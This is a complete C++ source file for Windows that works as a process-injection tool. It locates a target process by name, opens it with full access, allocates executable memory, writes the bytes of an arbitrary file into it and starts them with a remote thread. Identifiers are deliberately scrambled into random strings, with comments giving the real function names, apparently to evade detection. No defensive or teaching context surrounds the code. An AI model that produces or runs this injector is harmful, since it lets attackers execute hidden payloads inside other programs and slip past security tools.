#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <vector>
#include <fstream>

// Function to read file into bytes (ReadFileToBytes)
std::vector<unsigned char> x7d9f2(const std::string& a1b2c) {
    std::ifstream f1(a1b2c, std::ios::binary);
    if (!f1) {
        std::cout << "Error opening: " << a1b2c << std::endl;
        return {};
    }
    return std::vector<unsigned char>(
        std::istreambuf_iterator<char>(f1),
        std::istreambuf_iterator<char>()
    );
}

// Function to get process ID by name (GetProcessIdByName)
DWORD k8j3m(const wchar_t* n4p7q) {
    DWORD p1d2 = 0;
    HANDLE s9n4 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (s9n4 != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W p3e2;
        p3e2.dwSize = sizeof(p3e2);
        
        if (Process32FirstW(s9n4, &p3e2)) {
            do {
                if (_wcsicmp(p3e2.szExeFile, n4p7q) == 0) {
                    p1d2 = p3e2.th32ProcessID;
                    break;
                }
            } while (Process32NextW(s9n4, &p3e2));
        }
        CloseHandle(s9n4);
    }
    return p1d2;
}

// Function to inject file into process (InjectFile)
bool m2n8p(DWORD p1d2, const std::vector<unsigned char>& d4t5) {
    if (d4t5.empty()) {
        std::cout << "No data" << std::endl;
        return false;
    }

    HANDLE h1n2 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, p1d2);
    if (h1n2 == NULL) {
        std::cout << "Error opening process: " << GetLastError() << std::endl;
        return false;
    }

    LPVOID m3m4 = VirtualAllocEx(h1n2, NULL, d4t5.size(), 
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (m3m4 == NULL) {
        std::cout << "Error allocating memory: " << GetLastError() << std::endl;
        CloseHandle(h1n2);
        return false;
    }

    if (!WriteProcessMemory(h1n2, m3m4, d4t5.data(), d4t5.size(), NULL)) {
        std::cout << "Error writing memory: " << GetLastError() << std::endl;
        VirtualFreeEx(h1n2, m3m4, 0, MEM_RELEASE);
        CloseHandle(h1n2);
        return false;
    }

    HANDLE t1h2 = CreateRemoteThread(h1n2, NULL, 0, 
        (LPTHREAD_START_ROUTINE)m3m4, NULL, 0, NULL);
    if (t1h2 == NULL) {
        std::cout << "Error creating thread: " << GetLastError() << std::endl;
        VirtualFreeEx(h1n2, m3m4, 0, MEM_RELEASE);
        CloseHandle(h1n2);
        return false;
    }

    CloseHandle(t1h2);
    CloseHandle(h1n2);
    return true;
}

int main(int a1, char* a2[]) {
    if (a1 != 3) {
        std::cout << "Usage: " << a2[0] << " <target> <file>" << std::endl;
        return 1;
    }

    std::string t1 = a2[1];
    std::wstring w1(t1.begin(), t1.end());
    
    std::vector<unsigned char> d1 = x7d9f2(a2[2]);
    if (d1.empty()) {
        return 1;
    }

    DWORD p1 = k8j3m(w1.c_str());
    if (p1 == 0) {
        std::cout << "Process not found" << std::endl;
        return 1;
    }

    std::cout << "Found PID: " << p1 << std::endl;
    std::cout << "Data size: " << d1.size() << " bytes" << std::endl;
    
    if (m2n8p(p1, d1)) {
        std::cout << "Success" << std::endl;
    } else {
        std::cout << "Failed" << std::endl;
    }

    return 0;
} 